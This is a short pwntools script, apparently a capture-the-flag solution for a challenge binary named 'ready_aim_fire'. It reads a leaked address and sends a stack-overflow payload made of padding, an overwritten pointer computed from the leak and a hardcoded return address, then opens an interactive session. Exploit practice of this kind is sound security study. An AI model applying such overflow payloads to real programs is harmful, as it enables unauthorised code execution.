from pwn import *

e = ELF("./ready_aim_fire")

io = gdb.debug("./ready_aim_fire",'''break fire''')

io.recvuntil(b"cannon!\n")
leak = int(io.recvline(), 16)
print(hex(leak))

payload = b'A'*44 + p64(leak + 20) + p64(0x402547) #4012e4 works
#payload = b'A'*32 
io.sendline(payload)

io.interactive()
